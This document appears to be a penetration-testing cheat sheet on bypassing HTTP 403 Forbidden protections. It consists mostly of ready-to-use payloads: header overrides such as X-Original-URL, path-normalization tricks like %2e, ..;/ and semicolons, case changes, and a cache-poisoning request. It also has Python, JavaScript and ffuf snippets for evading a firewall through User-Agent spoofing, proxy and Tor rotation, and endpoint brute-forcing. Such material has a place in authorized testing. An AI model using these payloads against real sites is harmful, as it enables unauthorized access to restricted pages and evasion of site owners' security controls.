# Bypass 403 (Forbidden)
### Using `X-Original-URL` header
```bash
# Normal Request (403)
GET /admin HTTP/1.1
Host: target.com

# Try this to bypass (200)
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

### Appending `%2e` after the first slash
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/%2e/admin
```
### Try add dot `.` slash `/` and semicolon `;` in the URL
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/admin/.
http://target.com//admin//
http://target.com/./admin/..
http://target.com/;/admin
http://target.com/.;/admin
http://target.com//;//admin
```
### Add `..;/` after the directory name
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/admin..;/
```
### Try to uppercase the alphabet in the url
```bash
# Normal Request (403)
http://target.com/admin

# Try this to bypass (200)
http://target.com/aDmIN
```

## Via Web Cache Poisoning
```bash
GET /anything HTTP/1.1
Host: victim.com
X­-Original-­URL: /admin
```
## Other Tricks
bypassing a 403 Forbidden error, especially when dealing with a firewall like Akamai's Ghost, can be challenging. However, there are several techniques and strategies you can employ to try and circumvent such restrictions. Here are some methods:

**1. User-Agent Spoofing**

Websites often block certain User-Agent strings. You can try spoofing your User-Agent to appear as a different browser or bot.
```python
import requests

url = "http://target.com"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"}

response = requests.get(url, headers=headers)
print(response.status_code)
```

**2. IP Rotation**

Rotating your IP address can help bypass some rate-limiting or geo-blocking measures. You can use proxies or VPNs for this purpose.
```python
proxies = {
    'http': 'http://your_proxy_ip:port',
    'https': 'http://your_proxy_ip:port'
}

response = requests.get(url, proxies=proxies)
print(response.status_code)
```

**3. Referer Header**

Sometimes, adding a Referer header can make it appear as if the request is coming from a legitimate source.
```python
headers = {
    "Referer": "http://target.com",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

response = requests.get(url, headers=headers)
print(response.status_code)
```

**4. Cookies**

Sometimes, websites use cookies to track and block requests. You can try to mimic legitimate cookies.
```python
cookies = {
    'cookie_name': 'cookie_value'
}

response = requests.get(url, cookies=cookies)
print(response.status_code)
```

**5. Session Management**

Maintain a session to bypass certain restrictions.
```python
session = requests.Session()
session.get("http://target.com")
response = session.get("http://target.com/protected_page")
print(response.status_code)
```

**6. Bypassing via JavaScript**

Some websites use JavaScript to dynamically load content, which can bypass certain server-side restrictions. You can use tools like Selenium or Puppeteer to automate browser interactions.

Selenium Example:
```python
from selenium import webdriver

driver = webdriver.Chrome()
driver.get("http://target.com")

# Perform actions like clicking buttons or filling forms
driver.find_element_by_xpath("//button[@id='login']").click()

# Extract content
content = driver.page_source
print(content)

driver.quit()
```

Puppeteer Example:
```javascript
const puppeteer = require('puppeteer');

(async () => {
  const browser = await puppeteer.launch();
  const page = await browser.newPage();
  await page.goto('http://target.com');

  // Perform actions like clicking buttons or filling forms
  await page.click('button#login');

  // Extract content
  const content = await page.content();
  console.log(content);

  await browser.close();
})();
```

**7. Using Tor or Other Anonymity Networks**

Using Tor or other anonymity networks can help bypass IP-based restrictions.
```python
import requests

# Define the SOCKS5 proxy
proxies = {
    'http': 'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

# Define the URL
url = 'http://target.com'

# Send the request through the proxy
try:
    response = requests.get(url, proxies=proxies, timeout=10)
    print("Status Code:", response.status_code)
    print("Response Content:", response.text)
except requests.exceptions.RequestException as e:
    print(f"Error: {e}")
```

**8. Checking for Bypass URLs**

Sometimes, websites have alternative URLs that are not protected by the same firewall rules.

**9. Using Browser Extensions**

Browser extensions like `SwitchyOmega` can help manage different profiles and settings to bypass restrictions.

**10. Fuzzing and Brute Forcing**

Tools like `ffuf` can be used to brute-force and discover hidden endpoints or parameters that might bypass restrictions.
```bash
ffuf -u http://target.com/FUZZ -w /path/to/wordlist.txt 
```




















